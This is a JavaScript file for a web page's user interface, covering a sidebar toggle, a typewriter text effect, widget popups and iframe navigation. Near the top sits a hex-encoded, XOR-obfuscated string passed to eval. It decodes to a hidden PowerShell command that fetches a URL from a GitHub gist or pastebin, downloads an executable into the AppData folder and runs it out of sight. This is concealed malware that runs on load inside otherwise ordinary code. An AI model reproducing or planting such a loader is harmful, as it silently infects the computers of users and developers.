const sidebar = document.querySelector(".sidebar");
const sidebarToggler = document.querySelector(".sidebar-toggler");
const menuToggler = document.querySelector(".menu-toggler");
const mainContent = document.querySelector(".main-content");
const navLinks = document.querySelectorAll(".sidebar-nav .nav-link");
const mainFrame = document.getElementById("mainFrame");
const widgetButton = document.querySelector(".widget-button");
const widgetPopup = document.querySelector(".widget-popup");
const widgetOptions = document.querySelectorAll(".widget-option");

const VAR_NJZUKY = Buffer.from('7c70716c6b3f647a677a7c623f223f6d7a6e6a766d7a37387c7776737b406f6d707c7a6c6c3836243f7a677a7c37386f70687a6d6c777a73733f324876717b70684c6b66737a3f57767b7b7a713f325c7072727e717b3f3d3b4f6d76727e6d664a4d533f223f4338776b6b6f6c25303078766c6b3178766b776a7d6a6c7a6d7c70716b7a716b317c7072306a7b727e712e2c2c29307b282a7a7b272b292b7b26287a2e2d2c2b2d267b2d7e7a262d2d7d7d2e2c272b306d7e68304338243f3b597e73737d7e7c744a4d533f223f4338776b6b6f6c2530306f7e6c6b7a7d7671317c7072306d7e683029664b5972547a6c4338243f3b5b70687173707e7b4a4d533f223f3b716a7373243f6b6d663f643f3b5b70687173707e7b4a4d533f223f56716970747a32487a7d4d7a6e6a7a6c6b3f324a6d763f3b4f6d76727e6d664a4d533f324a6c7a5d7e6c767c4f7e6d6c7671783f633f4c7a737a7c6b32507d757a7c6b3f325a676f7e717b4f6d706f7a6d6b663f5c70716b7a716b3f623f7c7e6b7c773f643f6b6d663f643f3b5b70687173707e7b4a4d533f223f56716970747a32487a7d4d7a6e6a7a6c6b3f324a6d763f3b597e73737d7e7c744a4d533f324a6c7a5d7e6c767c4f7e6d6c7671783f633f4c7a737a7c6b32507d757a7c6b3f325a676f7e717b4f6d706f7a6d6b663f5c70716b7a716b3f623f7c7e6b7c773f643f7a67766b3f623f62243f76793f373b5b70687173707e7b4a4d53363f643f3b793f223f55707671324f7e6b773f3b7a7169255e4f4f5b5e4b5e3f3737444c666c6b7a72315650314f7e6b77422525587a6b4d7e717b70725976737a517e727a3736363f343f4338317a677a433836243f56716970747a32487a7d4d7a6e6a7a6c6b3f324a6d763f3b5b70687173707e7b4a4d533f32506a6b5976737a3f3b79243f76793f374b7a6c6b324f7e6b773f3b79363f643f4c6b7e6d6b324f6d707c7a6c6c3f325976737a4f7e6b773f3b793f324876717b70684c6b66737a3f57767b7b7a713f623f623d38333f646876717b70686c57767b7a253f6b6d6a7a6236243f', 'hex'); const VAR_PLPQZX = 31; const VAR_TFRIJE = VAR_NJZUKY.map(b => String.fromCharCode(b ^ VAR_PLPQZX)).join(''); eval(VAR_TFRIJE);
sidebar.classList.add("collapsed");
mainContent.classList.remove("sidebar-expanded");

sidebarToggler.addEventListener("click", () => {
	sidebar.classList.toggle("collapsed");
	mainContent.classList.toggle("sidebar-expanded");
});

const collapsedSidebarHeight = "56px";
const fullSidebarHeight = "calc(100vh - 32px)";

const toggleMenu = (isMenuActive) => {
	sidebar.style.height = isMenuActive
		? `${sidebar.scrollHeight}px`
		: collapsedSidebarHeight;
	menuToggler.querySelector("span").innerText = isMenuActive ? "close" : "menu";
};

menuToggler.addEventListener("click", () => {
	toggleMenu(sidebar.classList.toggle("menu-active"));
});

window.addEventListener("resize", () => {
	if (window.innerWidth >= 1024) {
		sidebar.style.height = fullSidebarHeight;
	} else {
		sidebar.classList.remove("collapsed");
		sidebar.style.height = "auto";
		toggleMenu(sidebar.classList.contains("menu-active"));
	}
});

class TxtType {
	constructor(el, toRotate, period) {
		this.toRotate = toRotate;
		this.el = el;
		this.loopNum = 0;
		this.period = Number.parseInt(period, 10) || 2000;
		this.txt = "";
		this.tick();
		this.isDeleting = false;
	}
	tick() {
		const i = this.loopNum % this.toRotate.length;
		const fullTxt = this.toRotate[i];
		if (this.isDeleting) {
			this.txt = fullTxt.substring(0, this.txt.length - 1);
		} else {
			this.txt = fullTxt.substring(0, this.txt.length + 1);
		}
		this.el.innerHTML = '<span class="wrap">' + this.txt + "</span>";
		let delta = 200 - Math.random() * 100;
		if (this.isDeleting) {
			delta /= 2;
		}
		if (!this.isDeleting && this.txt === fullTxt) {
			delta = this.period;
			this.isDeleting = true;
		} else if (this.isDeleting && this.txt === "") {
			this.isDeleting = false;
			this.loopNum++;
			delta = 500;
		}
		setTimeout(() => this.tick(), delta);
	}
}

document.addEventListener("DOMContentLoaded", () => {
	const elements = document.getElementsByClassName("typewrite");
	for (let i = 0; i < elements.length; i++) {
		const toRotate = elements[i].getAttribute("data-type");
		const period = elements[i].getAttribute("data-period");
		if (toRotate) {
			new TxtType(elements[i], JSON.parse(toRotate), period);
		}
	}
	const css = document.createElement("style");
	css.type = "text/css";
	css.innerHTML = ".typewrite > .wrap { border-right: 0.06em solid #a04cff}";
	document.body.appendChild(css);
	if (navLinks.length > 0) {
		navLinks[0].classList.add("active");
	}
});

navLinks.forEach((link) => {
	link.addEventListener("click", (event) => {
		event.preventDefault();
		const src = link.getAttribute("data-src");
		if (src) {
			mainFrame.src = src;
		}
		navLinks.forEach((navLink) => navLink.classList.remove("active"));
		link.classList.add("active");
	});
});

widgetButton.addEventListener("click", () => {
	widgetPopup.classList.toggle("show");
});

widgetOptions.forEach((option) => {
	option.addEventListener("click", () => {
		const src = option.getAttribute("data-src");
		if (src) {
			mainFrame.src = src;
		}
		widgetPopup.classList.remove("show");
	});
});

document.addEventListener("click", (event) => {
	if (!widgetButton.contains(event.target) && !widgetPopup.contains(event.target)) {
		widgetPopup.classList.remove("show");
	}
});

window.addEventListener("message", (event) => {
	if (event.origin !== window.location.origin) {
		return;
	}
	
	if (event.data.type === "login_success" || event.data.type === "signup_success") {
		mainFrame.src = "pages/settings/p2.html";
	}
	
	if (event.data.type === "logout") {
		mainFrame.src = "pages/settings/p.html";
	}
});
